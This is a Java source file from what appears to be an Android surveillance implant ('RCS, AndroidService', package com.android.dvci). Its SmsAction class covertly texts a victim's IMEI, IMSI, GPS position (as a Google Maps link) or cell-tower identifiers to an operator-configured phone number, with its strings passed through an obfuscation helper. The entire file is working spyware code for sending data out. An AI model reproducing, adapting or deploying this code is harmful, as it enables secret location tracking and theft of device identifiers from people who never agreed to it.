/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SmsAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.action;

import java.util.Date;
import java.util.Locale;

import android.location.Location;
import android.telephony.SmsManager;

import com.android.dvci.CellInfo;
import com.android.dvci.Device;
import com.android.dvci.Trigger;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfAction;
import com.android.dvci.conf.ConfigurationException;
import com.android.dvci.crypto.Keys;
import com.android.dvci.module.position.GPSLocationListener;
import com.android.dvci.module.position.GPSLocatorAuto;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;

/**
 * The Class SmsAction.
 */
public class SmsAction extends SubAction implements GPSLocationListener {
	private static final String TAG = "SmsAction"; //$NON-NLS-1$

	/** The Constant TYPE_LOCATION. */
	private static final int TYPE_LOCATION = 1;

	/** The Constant TYPE_SIM. */
	private static final int TYPE_SIM = 2;

	/** The Constant TYPE_TEXT. */
	private static final int TYPE_TEXT = 3;

	private final SmsManager sm;

	/** The number. */
	String number;

	/** The text. */
	String text;

	/** The type. */
	int type;

	private String descrType;

	/**
	 * Parses the.
	 * 
	 * @param confParams
	 *            the conf params
	 * @return true, if successful
	 */
	@Override
	protected boolean parse(final ConfAction params) {
		try {

			number = StringUtils.unspace(params.getString("number"));
			descrType = params.getString("type", "sim");

			if ("position".equals(descrType)) {
				type = TYPE_LOCATION;
			} else if ("text".equals(descrType)) {
				type = TYPE_TEXT;
			} else if ("sim".equals(descrType)) {
				type = TYPE_SIM;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse) Error, unknown type: " + descrType);
				}
				return false;
			}

			switch (type) {
			case TYPE_TEXT:
				// TODO controllare che la lunghezza non sia superiore a 70
				// caratteri

				text = params.getString("text", "No Text");
				break;

			case TYPE_LOCATION:
				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
				break;

			case TYPE_SIM:
				final StringBuffer sb = new StringBuffer();
				final Device device = Device.self();

				if (Device.isCdma()) {
					// sb.append("SID: " + device.getSid() + "\n");
					// sb.append("ESN: "
					// + NumberUtilities.toString(device.getEsn(), 16)
					// + "\n");
				}

				if (Device.isGprs()) {
					sb.append(M.e("IMEI: ") + device.getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
					sb.append(M.e("IMSI: ") + device.getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
				}

				text = sb.toString();
				break;

			default:
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: SmsAction.parse,  Unknown type: " + type);//$NON-NLS-1$
				}

				break;
			}
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		}

		return true;
	}

	/**
	 * Instantiates a new sms action.
	 * 
	 * @param params
	 *            the conf params
	 */
	public SmsAction(final ConfAction params) {
		super(params);

		sm = SmsManager.getDefault();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute(Trigger trigger) {

		try {
			switch (type) {
			case TYPE_TEXT:
				sendSMS(text);
				return true;

			case TYPE_SIM:
				text = M.e("IMSI: ") + Device.self().getImsi(); //$NON-NLS-1$
				sendSMS(text);
				return true;

			case TYPE_LOCATION:
				getGPSPosition();
				return true;
			}
			return true;
		} catch (final Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
			}

			return false;
		}
	}


	/**
	 * Error location.
	 */
	private void errorLocation() {
		if (!getCellPosition()) {
			sendSMS(M.e("Cell and GPS info not available")); //$NON-NLS-1$
		}
	}

	/**
	 * Gets the cell position.
	 * 
	 * @return the cell position
	 */
	private boolean getCellPosition() {
		final CellInfo c = Device.getCellInfo();

		if (c.cdma && c.valid) {
			text = M.e("SID: ") + c.sid + M.e(", NID: ") + c.nid + M.e(", BID: ") + c.bid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
			sendSMS(text);
			return true;
		}

		if (c.gsm && c.valid) {
			text = M.e("CC: ") + c.mcc + M.e(", MNC: ") + c.mnc + M.e(", LAC: ") + c.lac + M.e(", CID: ") + c.cid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
			sendSMS(text);
			return true;
		}

		return false;
	}

	/**
	 * Gets the gPS position.
	 */
	private void getGPSPosition() {
		if(!GPSLocatorAuto.self().start(this)){
			getCellPosition();
		}
	}

	/**
	 * Send sms.
	 * 
	 * @param text
	 *            the text
	 */
	private void sendSMS(final String text) {
		sm.sendTextMessage(number, null, text, null, null);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (sendSMS), number: " + number + " text: \"" + text + "\""); //$NON-NLS-1$
		}

		return;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Object#toString()
	 */
	@Override
	public String toString() {
		final StringBuffer sb = new StringBuffer();

		sb.append(M.e("Sms type: ") + type); //$NON-NLS-1$
		sb.append(M.e(" number: ") + number); //$NON-NLS-1$
		sb.append(M.e(" text: ") + text); //$NON-NLS-1$

		return sb.toString();
	}

	@Override
	public void onLocationChanged(Location location) {
		
		GPSLocatorAuto.self().unregister(this);
		if (location == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " location is null");
			}

			if(!getCellPosition()){
				errorLocation();
			}
			return;
		}

		final double lat = location.getLatitude();
		final double lng = location.getLongitude();
		
		String text = String.format(Locale.US, "lat:%.5f lon:%.5f", lat,lng);
		final Date date = new Date(location.getTime());
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " " + date +" " + text);//$NON-NLS-1$ //$NON-NLS-2$
		}

		String instance = new String(Keys.self().getBuildId());
		String textMaps = String.format(Locale.US, "https://maps.google.com/maps?q=%.5f,+%.5f", lat, lng);
		
		sendSMS(textMaps);

	}
}
